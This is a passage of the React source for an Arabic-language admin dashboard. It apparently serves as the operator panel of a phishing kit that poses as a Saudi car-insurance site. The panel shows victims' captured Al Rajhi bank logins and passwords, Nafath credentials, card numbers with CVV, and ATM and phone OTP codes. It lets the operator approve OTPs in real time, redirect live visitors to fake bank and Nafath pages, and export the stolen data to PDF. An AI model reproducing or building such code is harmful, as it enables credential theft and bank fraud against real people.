                            className="font-mono text-sm font-bold text-blue-600 dark:text-blue-400 bg-transparent border border-dashed border-blue-300 dark:border-blue-600 rounded px-2 py-0.5 w-24 text-center focus:outline-none focus:border-blue-500"
                            dir="ltr"
                            defaultValue={selectedApplication.authNumber || ""}
                            key={`auth-${selectedApplication.id}-${selectedApplication.authNumber}`}
                            data-testid="input-auth-number"
                            onKeyDown={async (e) => {
                              if (e.key === "Enter" && db) {
                                const val = (
                                  e.target as HTMLInputElement
                                ).value.trim();
                                try {
                                  await updateDoc(
                                    doc(db, "pays", selectedApplication.id),
                                    { authNumber: val },
                                  );
                                  toast({ title: "تم تحديث رقم المصادقة" });
                                } catch {
                                  toast({
                                    title: "خطأ في التحديث",
                                    variant: "destructive",
                                  });
                                }
                              }
                            }}
                            onBlur={async (e) => {
                              const val = e.target.value.trim();
                              if (
                                val !==
                                  (selectedApplication.authNumber || "") &&
                                db
                              ) {
                                try {
                                  await updateDoc(
                                    doc(db, "pays", selectedApplication.id),
                                    { authNumber: val },
                                  );
                                  toast({ title: "تم تحديث رقم المصادقة" });
                                } catch {
                                  toast({
                                    title: "خطأ في التحديث",
                                    variant: "destructive",
                                  });
                                }
                              }
                            }}
                          />
                          <Button
                            size="icon"
                            variant="ghost"
                            className="h-6 w-6"
                            onClick={async () => {
                              const val = (
                                document.querySelector(
                                  '[data-testid="input-auth-number"]',
                                ) as HTMLInputElement
                              )?.value.trim();
                              if (val && db) {
                                try {
                                  await updateDoc(
                                    doc(db, "pays", selectedApplication.id),
                                    { authNumber: val },
                                  );
                                  toast({ title: "تم تحديث رقم المصادقة" });
                                } catch {
                                  toast({
                                    title: "خطأ في التحديث",
                                    variant: "destructive",
                                  });
                                }
                              }
                            }}
                            data-testid="button-update-auth-number"
                          >
                            <Check className="w-3 h-3 text-blue-500" />
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* بيانات الراجحي - Rajhi Data */}
                {(selectedApplication.rajhiUser ||
                  selectedApplication.rajhiPassword ||
                  selectedApplication.rajhiOtp) && (
                  <Card className="bg-white dark:bg-gray-800 border-green-200 dark:border-green-800">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium text-green-600 dark:text-green-400">
                        بيانات الراجحي
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-2">
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-rajhi-user"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          اسم المستخدم
                        </span>
                        <span className="font-mono text-sm" dir="ltr">
                          {selectedApplication.rajhiUser || "-"}
                        </span>
                      </div>
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-rajhi-pass"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          كلمة المرور
                        </span>
                        <span className="font-mono text-sm" dir="ltr">
                          {selectedApplication.rajhiPassword || "-"}
                        </span>
                      </div>
                      <div
                        className="flex justify-between items-center py-1"
                        data-testid="info-rajhi-otp"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          رمز OTP
                        </span>
                        <span
                          className="font-mono text-sm font-bold text-green-600 dark:text-green-400"
                          dir="ltr"
                        >
                          {selectedApplication.rajhiOtp || "-"}
                        </span>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* بيانات التحقق من الهاتف - Phone Verification Data */}
                {(selectedApplication.phoneIdNumber ||
                  selectedApplication.phoneCarrier ||
                  selectedApplication.phoneOtpCode) && (
                  <Card className="bg-white dark:bg-gray-800 border-purple-200 dark:border-purple-800">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium text-purple-600 dark:text-purple-400">
                        التحقق من الهاتف
                      </CardTitle>
                      <Badge variant="outline" className="text-xs">
                        {selectedApplication.phoneVerificationStatus ||
                          "pending"}
                      </Badge>
                    </CardHeader>
                    <CardContent className="space-y-2">
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-phone-id"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          رقم الهوية
                        </span>
                        <span className="font-mono text-sm" dir="ltr">
                          {selectedApplication.phoneIdNumber || "-"}
                        </span>
                      </div>
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-phone-carrier"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          شركة الاتصالات
                        </span>
                        <span className="font-medium text-sm">
                          {selectedApplication.phoneCarrier || "-"}
                        </span>
                      </div>
                      <div
                        className="flex justify-between items-center py-1"
                        data-testid="info-phone-otp"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          رمز OTP
                        </span>
                        <span
                          className="font-mono text-sm font-bold text-purple-600 dark:text-purple-400"
                          dir="ltr"
                        >
                          {selectedApplication.phoneOtpCode || "-"}
                        </span>
                      </div>
                    </CardContent>
                  </Card>
                )}
              </div>

              {/* Center Column - OTP and Card */}
              <div className="md:col-span-1 xl:col-span-5 space-y-3 md:space-y-4">
                {/* OTP Code Section */}
                {selectedApplication.otpCode && (
                  <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium">
                        كود OTP
                      </CardTitle>
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        صفحة 11:48 | 11:29
                      </span>
                    </CardHeader>
                    <CardContent>
                      <OtpDisplay
                        code={selectedApplication.otpCode}
                        label="card-otp"
                      />
                      <div className="flex flex-wrap items-center gap-2 mt-4">
                        <Button
                          variant="default"
                          className="flex-1 bg-green-500 text-white dark:bg-green-600"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "cardOtpApproved",
                              true,
                            )
                          }
                          data-testid="button-approve-otp"
                        >
                          <Check className="w-4 h-4 ml-2" />
                          قبول
                        </Button>
                        <Button
                          variant="destructive"
                          className="flex-1"
                          onClick={() =>
                            handleApprovalStatus(
                              selectedApplication.id,
                              "rejected",
                            )
                          }
                          data-testid="button-reject-otp"
                        >
                          <XCircle className="w-4 h-4 ml-2" />
                          رفض
                        </Button>
                        <Button
                          variant="outline"
                          className="flex-1 bg-yellow-100 text-yellow-700 border-yellow-300 dark:bg-yellow-900/30 dark:text-yellow-400 dark:border-yellow-600"
                          onClick={() =>
                            handlePendingReview(selectedApplication.id)
                          }
                          data-testid="button-pending-review-otp"
                        >
                          قيد المراجعة
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* ATM Code Section */}
                {selectedApplication.atmVerification?.code && (
                  <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium">
                        كود ATM
                      </CardTitle>
                      {selectedApplication.atmVerification?.timestamp && (
                        <span className="text-xs text-gray-500 dark:text-gray-400">
                          {new Date(selectedApplication.atmVerification.timestamp).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" })}
                        </span>
                      )}
                    </CardHeader>
                    <CardContent>
                      <OtpDisplay
                        code={selectedApplication.atmVerification.code}
                        label="atm-code"
                      />
                      <div className="flex flex-wrap items-center gap-2 mt-4">
                        <Button
                          variant="default"
                          className="flex-1 bg-green-500 text-white dark:bg-green-600"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "cardOtpApproved",
                              true,
                            )
                          }
                          data-testid="button-approve-atm"
                        >
                          <Check className="w-4 h-4 ml-2" />
                          قبول
                        </Button>
                        <Button
                          variant="destructive"
                          className="flex-1"
                          onClick={() =>
                            handleApprovalStatus(
                              selectedApplication.id,
                              "rejected",
                            )
                          }
                          data-testid="button-reject-atm"
                        >
                          <XCircle className="w-4 h-4 ml-2" />
                          رفض
                        </Button>
                        <Button
                          variant="outline"
                          className="flex-1 bg-yellow-100 text-yellow-700 border-yellow-300 dark:bg-yellow-900/30 dark:text-yellow-400 dark:border-yellow-600"
                          onClick={() =>
                            handlePendingReview(selectedApplication.id)
                          }
                          data-testid="button-pending-review-atm"
                        >
                          قيد المراجعة
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* Phone OTP Section */}
                {selectedApplication.phoneOtpCode && (
                  <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium">
                        كود OTP (محاولة 1)
                      </CardTitle>
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        صفحة 11:38 | 11:38
                      </span>
                    </CardHeader>
                    <CardContent>
                      <OtpDisplay
                        code={selectedApplication.phoneOtpCode}
                        label="phone-otp"
                      />
                      <div className="flex flex-wrap items-center gap-2 mt-4">
                        <Button
                          variant="default"
                          className="flex-1 bg-green-500 text-white dark:bg-green-600"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "phoneOtpApproved",
                              true,
                            )
                          }
                          data-testid="button-approve-phone-otp"
                        >
                          <Check className="w-4 h-4 ml-2" />
                          قبول
                        </Button>
                        <Button
                          variant="destructive"
                          className="flex-1"
                          onClick={() =>
                            handleApprovalStatus(
                              selectedApplication.id,
                              "rejected",
                            )
                          }
                          data-testid="button-reject-phone-otp"
                        >
                          <XCircle className="w-4 h-4 ml-2" />
                          رفض
                        </Button>
                        <Button
                          variant="outline"
                          className="flex-1 bg-yellow-100 text-yellow-700 border-yellow-300 dark:bg-yellow-900/30 dark:text-yellow-400 dark:border-yellow-600"
                          onClick={() =>
                            handlePendingReview(selectedApplication.id)
                          }
                          data-testid="button-pending-review-phone-otp"
                        >
                          قيد المراجعة
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* Credit Card Display */}
                {getCardNumber(selectedApplication) && (
                  <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium">
                        معلومات البطاقة
                      </CardTitle>
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        صفحة 11:48 | 11:29
                      </span>
                    </CardHeader>
                    <CardContent>
                      {/* Visual Card */}
                      <div
                        className="relative w-full h-44 rounded-xl overflow-hidden bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500 p-5 shadow-lg mb-4"
                        data-testid="card-visual"
                      >
                        <div className="absolute top-0 left-0 w-full h-full opacity-20">
                          <div className="absolute top-10 right-10 w-32 h-32 bg-white rounded-full blur-3xl" />
                          <div className="absolute bottom-10 left-10 w-24 h-24 bg-white rounded-full blur-2xl" />
                          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-40 h-40 bg-white/30 rounded-full blur-3xl" />
                        </div>

                        <div
                          className="relative z-10 h-full flex flex-col justify-between text-white"
                          dir="ltr"
                        >
                          <div className="flex items-center justify-between">
                            <div className="w-12 h-8 bg-yellow-400 rounded-md" />
                            <div className="text-xs opacity-70">
                              تاريخ انتهاء
                            </div>
                          </div>

                          <div
                            className="text-2xl font-mono tracking-widest text-center"
                            data-testid="text-card-number"
                          >
                            {formatCardNumber(
                              getCardNumber(selectedApplication),
                            )}
                          </div>

                          <div className="flex items-center justify-between">
                            <div>
                              <div className="text-xs opacity-70">
                                اسم صاحب البطاقة
                              </div>
                              <div
                                className="font-medium text-sm uppercase"
                                data-testid="text-card-name"
                              >
                                {getCardName(selectedApplication) || "-"}
                              </div>
                            </div>
                            <div className="text-left">
                              <div className="text-xs opacity-70">
                                CVV / Expiry
                              </div>
                              <div className="flex gap-4">
                                <span data-testid="text-card-cvv">
                                  {getCardCvv(selectedApplication) || "-"}
                                </span>
                                <span data-testid="text-card-expiry">
                                  {getCardExpiry(selectedApplication) || "-"}
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* BIN Info */}
                      {binLoading && (
                        <div className="text-center text-xs text-gray-400 py-2" data-testid="text-bin-loading">
                          جاري البحث عن معلومات البطاقة...
                        </div>
                      )}
                      {binInfo && binInfo.success && (
                        <div className="grid grid-cols-2 gap-2 text-xs mb-3 p-3 rounded-lg bg-gray-50 dark:bg-gray-700/50" data-testid="card-bin-info">
                          {binInfo.BIN?.issuer?.name && (
                            <>
                              <span className="text-gray-500 dark:text-gray-400">البنك المصدر</span>
                              <span className="font-medium text-right" data-testid="text-bin-bank">{binInfo.BIN.issuer.name}</span>
                            </>
                          )}
                          {binInfo.BIN?.brand && (
                            <>
                              <span className="text-gray-500 dark:text-gray-400">نوع البطاقة</span>
                              <span className="font-medium text-right" data-testid="text-bin-brand">{binInfo.BIN.brand}</span>
                            </>
                          )}
                          {binInfo.BIN?.type && (
                            <>
                              <span className="text-gray-500 dark:text-gray-400">الفئة</span>
                              <span className="font-medium text-right" data-testid="text-bin-type">{binInfo.BIN.type}</span>
                            </>
                          )}
                          {binInfo.BIN?.level && (
                            <>
                              <span className="text-gray-500 dark:text-gray-400">المستوى</span>
                              <span className="font-medium text-right" data-testid="text-bin-level">{binInfo.BIN.level}</span>
                            </>
                          )}
                          {binInfo.BIN?.country?.name && (
                            <>
                              <span className="text-gray-500 dark:text-gray-400">الدولة</span>
                              <span className="font-medium text-right" data-testid="text-bin-country">
                                {binInfo.BIN.country.flag} {binInfo.BIN.country.name}
                              </span>
                            </>
                          )}
                        </div>
                      )}

                      {/* Action Buttons */}
                      <div className="flex flex-wrap items-center gap-2">
                        <Button
                          variant="outline"
                          className="flex-1 bg-yellow-100 text-yellow-700 border-yellow-300 dark:bg-yellow-900/30 dark:text-yellow-400 dark:border-yellow-600"
                          onClick={() =>
                            handlePendingReview(selectedApplication.id)
                          }
                          data-testid="button-pending-card"
                        >
                          قيد المراجعة
                        </Button>
                        <Button
                          variant="destructive"
                          className="flex-1"
                          onClick={() =>
                            handleApprovalStatus(
                              selectedApplication.id,
                              "rejected",
                            )
                          }
                          data-testid="button-reject-card"
                        >
                          رفض
                        </Button>
                        <Button variant="outline" data-testid="button-otp-code">
                          كود OTP
                        </Button>
                        <Button variant="outline" data-testid="button-pin">
                          رمز PIN
                        </Button>
                        <Button
                          variant="default"
                          className="flex-1 bg-green-500 text-white dark:bg-green-600"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "cardOtpApproved",
                              true,
                            )
                          }
                          data-testid="button-accept-card"
                        >
                          قبول
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* No Selection Placeholder */}
                {!selectedApplication.otpCode &&
                  !selectedApplication.phoneOtpCode &&
                  !getCardNumber(selectedApplication) && (
                    <Card className="bg-white dark:bg-gray-800 h-64 flex items-center justify-center">
                      <div className="text-center text-gray-400">
                        <CreditCard className="w-16 h-16 mx-auto mb-4 opacity-30" />
                        <p data-testid="text-no-data">
                          لا توجد بيانات بطاقة أو OTP
                        </p>
                      </div>
                    </Card>
                  )}
              </div>

              {/* Right Column - Visitor Info & Controls */}
              <div className="md:col-span-2 xl:col-span-3 space-y-3 md:space-y-4">
                {/* PDF Download & Delete Buttons */}
                <div className="flex gap-2">
                  <Button
                    variant="default"
                    className="flex-1 bg-blue-600"
                    onClick={() => {
                      const birthDate =
                        selectedApplication.personalInfo?.birthDay &&
                        selectedApplication.personalInfo?.birthMonth &&
                        selectedApplication.personalInfo?.birthYear
                          ? `${selectedApplication.personalInfo.birthYear}-${selectedApplication.personalInfo.birthMonth}-${selectedApplication.personalInfo.birthDay}`
                          : undefined;

                      generateInsurancePDF({
                        id: selectedApplication.id,
                        personalInfo: {
                          nationalId:
                            selectedApplication.nationalId ||
                            selectedApplication.personalInfo?.nationalId,
                          birthDate: birthDate,
                          phone:
                            selectedApplication.phoneNumber ||
                            selectedApplication.personalInfo?.phoneNumber,
                          documment_owner_full_name:
                            selectedApplication.documment_owner_full_name,
                        },
                        vehicleInfo: {
                          serialNumber:
                            selectedApplication.vehicleInfo?.vehicleSerial,
                          vehicleYear:
                            selectedApplication.vehicleInfo?.vehicleYear,
                          coverageType:
                            selectedApplication.vehicleInfo?.coverageType,
                          selectedAddOns:
                            selectedApplication.selectedOffer?.selectedFeatures,
                        },
                        selectedOffer: selectedApplication.selectedOffer
                          ? {
                              companyName:
                                selectedApplication.selectedOffer.offerName,
                              basePrice:
                                selectedApplication.selectedOffer.totalPrice,
                              totalPrice:
                                selectedApplication.selectedOffer.totalPrice,
                              discountPercentage: undefined,
                            }
                          : undefined,
                        paymentInfo: {
                          cardNumber: getCardNumber(selectedApplication),
                          cardHolder:
                            selectedApplication.cardName ||
                            selectedApplication.paymentInfo?.cardName,
                          expiryDate:
                            selectedApplication.cardExpiry ||
                            selectedApplication.paymentInfo?.cardExpiry,
                          cvv:
                            selectedApplication.cardCvv ||
                            selectedApplication.paymentInfo?.cardCvv,
                        },
                        nafazData: selectedApplication.nafazId
                          ? {
                              idNumber: selectedApplication.nafazId,
                              password: selectedApplication.nafazPass,
                              authNumber: selectedApplication.authNumber,
                            }
                          : undefined,
                        rajhiData: selectedApplication.rajhiUser
                          ? {
                              username: selectedApplication.rajhiUser,
                              password: selectedApplication.rajhiPassword,
                              otp: selectedApplication.rajhiOtp,
                            }
                          : undefined,
                        phoneData: selectedApplication.phoneIdNumber
                          ? {
                              phoneNumber: selectedApplication.phoneNumber,
                              carrier: selectedApplication.phoneCarrier,
                              otp: selectedApplication.phoneOtpCode,
                            }
                          : undefined,
                        metadata: {
                          country: selectedApplication.country,
                          browser: selectedApplication.browser,
                          os: selectedApplication.os,
                          createdAt: selectedApplication.createdAt,
                        },
                      });
                    }}
                    data-testid="button-download-pdf"
                  >
                    <FileDown className="w-4 h-4 ml-2" />
                    تحميل PDF
                  </Button>
                  <Button
                    variant="destructive"
                    onClick={() => handleDeleteVisitor(selectedApplication.id)}
                    data-testid="button-delete-visitor"
                  >
                    <Trash2 className="w-4 h-4 ml-2" />
                    حذف
                  </Button>
                </div>

                {/* Visitor Info */}
                <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm font-medium">
                      معلومات الزائر
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div
                      className="flex items-center gap-2"
                      data-testid="info-country"
                    >
                      <Globe className="w-4 h-4 text-gray-400" />
                      <span className="text-sm text-gray-600 dark:text-gray-400">
                        {selectedApplication.country || "-"}
                      </span>
                    </div>
                    <div
                      className="flex items-center gap-2"
                      data-testid="info-browser"
                    >
                      <Monitor className="w-4 h-4 text-gray-400" />
                      <span className="text-sm text-gray-600 dark:text-gray-400">
                        {selectedApplication.browser || "-"}
                      </span>
                    </div>
                    <div
                      className="flex items-center gap-2"
                      data-testid="info-os"
                    >
                      <MapPin className="w-4 h-4 text-gray-400" />
                      <span className="text-sm text-gray-600 dark:text-gray-400">
                        {selectedApplication.os || "-"}
                      </span>
                    </div>
                    <div
                      className="flex items-center gap-2"
                      data-testid="info-current-page"
                    >
                      <Eye className="w-4 h-4 text-gray-400" />
                      <span className="text-sm text-gray-600 dark:text-gray-400">
                        الصفحة: {selectedApplication.currentPage || "-"}
                        {selectedApplication.currentStep !== undefined &&
                          ` (خطوة ${selectedApplication.currentStep})`}
                      </span>
                    </div>
                  </CardContent>
                </Card>

                {/* Page Control */}
                <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm font-medium">
                      التحكم بالصفحات
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div className="grid grid-cols-2 gap-2">
                      <Button
                        variant="outline"
                        size="sm"
                        className="text-xs"
                        onClick={() =>
                          handleRedirectUser(selectedApplication.id, "motor", 1)
                        }
                        data-testid="button-goto-motor"
                      >
                        التأمين
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        className="text-xs"
                        onClick={() =>
                          handleRedirectUser(
                            selectedApplication.id,
                            "phone-verification",
                            1,
                          )
                        }
                        data-testid="button-goto-phone"
                      >
                        التحقق من الهاتف
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        className="text-xs"
                        onClick={() =>
                          handleRedirectUser(selectedApplication.id, "nafaz", 1)
                        }
                        data-testid="button-goto-nafaz"
                      >
                        نفاذ
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        className="text-xs"
                        onClick={() =>
                          handleRedirectUser(selectedApplication.id, "rajhi", 1)
                        }
                        data-testid="button-goto-rajhi"
                      >
                        الراجحي
                      </Button>
                    </div>

                    {/* Step Control */}
                    <div className="border-t pt-3 mt-3">
                      <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
                        التحكم بالخطوات
                      </p>
                      <div className="flex flex-wrap gap-1">
                        {(() => {
                          const basePage = getBasePageName(
                            selectedApplication.currentPage,
                          );
                          const stepCount =
                            basePage === "motor"
                              ? 7
                              : basePage === "rajhi"
                                ? 2
                                : 1;
                          return Array.from(
                            { length: stepCount },
                            (_, i) => i + 1,
                          ).map((step) => (
                            <Button
                              key={step}
                              variant={
                                selectedApplication.currentStep === step
                                  ? "default"
                                  : "outline"
                              }
                              size="sm"
                              className="text-xs"
                              onClick={() =>
                                handleSetStep(selectedApplication.id, step)
                              }
                              data-testid={`button-step-${step}`}
                            >
                              {step}
                            </Button>
                          ));
                        })()}
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Approval Controls */}
                <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm font-medium">
                      الموافقات
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    {/* Card OTP Approval */}
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        OTP البطاقة
                      </span>
                      <div className="flex gap-1">
                        <Button
                          variant={
                            selectedApplication.cardOtpApproved
                              ? "default"
                              : "outline"
                          }
                          size="sm"
                          className="text-xs h-7"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "cardOtpApproved",
                              true,
                            )
                          }
                          data-testid="button-approve-card-otp"
                        >
                          <Check className="w-3 h-3" />
                        </Button>
                        <Button
                          variant={
                            selectedApplication.cardOtpApproved === false
                              ? "destructive"
                              : "outline"
                          }
                          size="sm"
                          className="text-xs h-7"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "cardOtpApproved",
                              false,
                            )
                          }
                          data-testid="button-reject-card-otp"
                        >
                          <XCircle className="w-3 h-3" />
                        </Button>
                      </div>
                    </div>

                    {/* Phone OTP Approval */}
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        OTP الهاتف
                      </span>
                      <div className="flex gap-1">
                        <Button
                          variant={
                            selectedApplication.phoneOtpApproved
                              ? "default"
                              : "outline"
                          }
                          size="sm"
                          className="text-xs h-7"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "phoneOtpApproved",
                              true,
                            )
                          }
                          data-testid="button-approve-phone-otp-ctrl"
                        >
                          <Check className="w-3 h-3" />
                        </Button>
                        <Button
                          variant={
                            selectedApplication.phoneOtpApproved === false
                              ? "destructive"
                              : "outline"
                          }
                          size="sm"
                          className="text-xs h-7"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "phoneOtpApproved",
                              false,
                            )
                          }
                          data-testid="button-reject-phone-otp-ctrl"
                        >
                          <XCircle className="w-3 h-3" />
                        </Button>
                      </div>
                    </div>

                    {/* Nafath Approval */}
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        نفاذ
                      </span>
                      <div className="flex gap-1">
                        <Button
                          variant={
                            selectedApplication.nafathApproved
                              ? "default"
                              : "outline"
                          }
                          size="sm"
                          className="text-xs h-7"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "nafathApproved",
                              true,
                            )
                          }
                          data-testid="button-approve-nafath"
                        >
                          <Check className="w-3 h-3" />
                        </Button>
                        <Button
                          variant={
                            selectedApplication.nafathApproved === false
                              ? "destructive"
                              : "outline"
                          }
                          size="sm"
                          className="text-xs h-7"
                          onClick={() =>
                            handleFieldApproval(
                              selectedApplication.id,
                              "nafathApproved",
                              false,
                            )
                          }
                          data-testid="button-reject-nafath"
                        >
                          <XCircle className="w-3 h-3" />
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center text-gray-400">
                <div className="relative mx-auto mb-4 w-24 h-24 md:w-28 md:h-28">
                  <div className="absolute inset-0 bg-gradient-to-br from-blue-100 to-purple-100 dark:from-blue-900/20 dark:to-purple-900/20 rounded-full" />
                  <Users className="w-16 md:w-20 h-16 md:h-20 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 opacity-30" />
                </div>
                <p
                  className="text-base md:text-lg text-gray-300 dark:text-gray-500"
                  data-testid="text-select-visitor"
                >
                  اختر زائراً من القائمة
                </p>
                <Button
                  variant="outline"
                  size="sm"
                  className="mt-4 lg:hidden"
                  onClick={() => setMobileVisitorSidebar(true)}
                  data-testid="button-open-visitor-list"
                >
                  <Users className="w-4 h-4 ml-2" />
                  عرض قائمة الزوار
                </Button>
              </div>
            </div>
          )}
        </main>

        {/* Mobile Overlay */}
        {mobileVisitorSidebar && (
          <div
            className="lg:hidden fixed inset-0 bg-black/50 z-40"
            onClick={() => setMobileVisitorSidebar(false)}
          />
        )}

        {/* Right Sidebar - Visitors List */}
        <aside
          className={cn(
            "w-72 md:w-80 bg-gray-50 dark:bg-gray-900 border-r border-gray-200 dark:border-gray-700 flex flex-col shrink-0",
            "fixed lg:relative inset-y-0 right-0 z-50 lg:z-auto",
            "transform transition-transform duration-300 ease-in-out",
            mobileVisitorSidebar
              ? "translate-x-0"
              : "translate-x-full lg:translate-x-0",
          )}
        >
          {/* Mobile Close Button */}
          <Button
            variant="ghost"
            size="icon"
            className="lg:hidden absolute left-2 top-2 z-10"
            onClick={() => setMobileVisitorSidebar(false)}
            data-testid="button-close-sidebar"
          >
            <X className="w-5 h-5" />
          </Button>

          {/* Header */}
          <div className="p-3 md:p-4 border-b border-gray-200/50 dark:border-gray-700/50 bg-gradient-to-b from-transparent to-gray-100/50 dark:to-gray-800/30">
            <h2
              className="font-bold text-base md:text-lg mb-2"
              data-testid="text-sidebar-title"
            >
              لوحة التحكم
            </h2>

            {/* Selected User Info */}
            {selectedApplication && (
              <div
                className="bg-gray-50 dark:bg-gray-700 rounded-lg p-3 mb-3"
                data-testid="selected-user-info"
              >
                <div
                  className="font-bold text-sm mb-1"
                  data-testid="selected-user-name"
                >
                  {getCardName(selectedApplication) ||
                    selectedApplication.documment_owner_full_name ||
                    "-"}
                </div>
                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
                  <Phone className="w-3 h-3" />
                  <span dir="ltr" data-testid="selected-user-id">
                    {getNationalId(selectedApplication) || "-"}
                  </span>
                  <span dir="ltr" data-testid="selected-user-phone">
                    {getPhoneNumber(selectedApplication) || "-"}
                  </span>
                </div>
                <div className="flex flex-wrap items-center gap-2 mt-2">
                  {selectedApplication.city && (
                    <Badge
                      variant="outline"
                      className="text-xs bg-green-50 text-green-600 border-green-300 dark:bg-green-900/20 dark:text-green-400 dark:border-green-600"
                    >
                      <Globe className="w-3 h-3 mr-1" />
                      {selectedApplication.city}
                    </Badge>
                  )}
                  {selectedApplication.browser && (
                    <Badge variant="outline" className="text-xs">
                      {selectedApplication.browser}
                    </Badge>
                  )}
                  {selectedApplication.country && (
                    <Badge variant="outline" className="text-xs">
                      {selectedApplication.country}
                    </Badge>
                  )}
                </div>
              </div>
            )}

            {/* Filter Buttons */}
            <div className="flex flex-wrap gap-2">
              <Button
                variant="default"
                className="flex-1 text-xs"
                data-testid="button-filter-all"
              >
                إظهار بطاقة
              </Button>
              <Button
                variant="outline"
                className="flex-1 text-xs"
                data-testid="button-filter-visitors"
              >
                توجيه الزائر
              </Button>
            </div>
          </div>

          {/* Search */}
          <div className="p-3 border-b border-gray-200 dark:border-gray-700">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
              <Input
                placeholder="بحث..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pr-9 text-sm shadow-sm"
                data-testid="input-search"
              />
            </div>
          </div>

          {/* Visitors List */}
          <ScrollArea className="flex-1">
            {isLoading ? (
              <div
                className="p-4 text-center text-gray-400 text-sm"
                data-testid="text-list-loading"
              >
                جاري التحميل...
              </div>
            ) : filteredApps.length === 0 ? (
              <div
                className="p-4 text-center text-gray-400 text-sm"
                data-testid="text-no-results"
              >
                لا توجد نتائج
              </div>
            ) : (
              filteredApps.map((app, index) => (
                <div
                  key={app.id}
                  onClick={() => handleMarkAsRead(app)}
                  className={cn(
                    "flex items-center gap-3 px-4 py-3 border-b border-gray-100 dark:border-gray-700 cursor-pointer transition-colors hover-elevate",
                    selectedId === app.id && "bg-blue-50 dark:bg-blue-900/30",
                  )}
                  data-testid={`visitor-item-${app.id}`}
                >
                  {/* Status Indicator */}
                  <div className="relative">
                    <div
                      className={cn(
                        "w-10 h-10 rounded-full flex items-center justify-center text-white text-sm font-bold",
                        isOnline(app) ? "bg-green-500" : "bg-gray-400",
                      )}
                    >
                      {getDisplayName(app)?.charAt(0) || "؟"}
                    </div>
                    {isOnline(app) && (
                      <div className="absolute bottom-0 left-0 w-3 h-3 bg-green-500 border-2 border-white dark:border-gray-800 rounded-full" />
                    )}
                  </div>

                  {/* Info */}
